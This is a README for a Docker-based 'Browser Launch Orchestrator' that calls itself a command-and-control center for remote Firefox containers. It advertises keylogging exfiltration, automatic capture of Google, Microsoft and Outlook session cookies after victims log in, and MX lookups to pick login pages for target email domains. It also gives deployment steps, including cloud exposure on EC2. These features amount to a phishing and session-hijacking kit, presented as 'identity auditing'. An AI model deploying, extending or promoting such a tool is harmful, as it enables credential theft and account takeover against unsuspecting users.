# Browser Launch Orchestrator (BLO)

A professional, Docker-based control plane for orchestrating isolated browser instances with advanced session auditing, keylogging, and identity exfiltration capabilities.

## Architecture & Features

This application acts as a "Command & Control" center for a fleet of remote Firefox containers.

- **🚢 Isolated Fleet**: Spawns independent `jlesage/firefox` containers for every user session.
- **🛡️ Secure Network**: Integrated Software Defined Firewall using the `iptables` `DOCKER-USER` chain to restrict access.
- **🕵️ Session Auditor**: Real-time keylogging exfiltration from the remote browser back to the orchestrator.
- **🔐 Identity Vault**: Automatically captures and syncs session-critical cookies (Google, Microsoft, Outlook, etc.) after successful logins.
- **🌐 Smart Routing**: Automatic login URL determination via MX record lookups for target email domains.
- **📊 Live Monitoring**: Dynamic resource utilization tracking (CPU, Memory, Uptime) for active instances.

## Prerequisites

- **Docker & Docker Compose**: Installed and running on the host system.
- **Linux Host**: Required for the `iptables` firewall functionality.
- **Node.js 20+**: If running the orchestrator outside of Docker for development.

## Quick Start (Docker Compose)

The easiest way to deploy the entire stack is using Docker Compose.

1. **Clone the repository**:
   ```bash
   git clone <repository-url>
   cd browser-orchestrator
   ```

2. **Start the Orchestrator**:
   ```bash
   docker-compose up --build -d
   ```

3. **Access the Web UI**:
   Open [http://localhost:3000](http://localhost:3000) in your browser.

## Manual Setup

### 1. Install Dependencies
```bash
npm install
```

### 2. Build Frontend
```bash
npm run build
```

### 3. Run the Server
```bash
# Development
npm run dev

# Production
npm start
```

## Security Configurations

### Firewall (iptables)
The application manages the `DOCKER-USER` chain. To ensure this works correctly:
1. Run the orchestrator with sufficient privileges to execute `iptables` (e.g., `sudo` or as `root` in the container).
2. Ensure your kernel supports the `iptables` module.

### Browser Extension
The custom extension is located in the `/extension` directory. It is automatically mounted into every browser container spawned by the orchestrator.

## Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `PORT` | The port the orchestrator listens on | `3000` |
| `NODE_ENV` | Environment mode (`development`/`production`) | `development` |
| `DOCKER_BROWSER_IMAGE` | The Firefox image to use | `jlesage/firefox:latest` |
| `PUBLIC_HOST` | The public IP/Hostname of the server | `localhost` |

## Public Access (EC2 / Cloud Deployment)

When deploying on a cloud provider like Amazon EC2, you must configure the following for remote browsers to be accessible from your local machine:

1. **Environment Variable**: Set `PUBLIC_HOST` to your EC2 instance's **Public IPv4 address** or **Public IPv4 DNS**.
   ```bash
   export PUBLIC_HOST="3.x.x.x"
   ```
2. **Security Groups**: Open the following ports in your EC2 Security Group:
   - `3000`: For the Orchestrator Web UI.
   - `6000-7000`: For the remote browser VNC/Web sessions (configurable range).

## Deployment Checklist

- [ ] Host server has Docker Engine installed.
- [ ] Port 3000 is open in the hardware firewall.
- [ ] Docker Socket is reachable at `/var/run/docker.sock`.
- [ ] Extension source path is correctly configured in `server.ts`.

---
*Developed for advanced browser orchestration and identity auditing.*
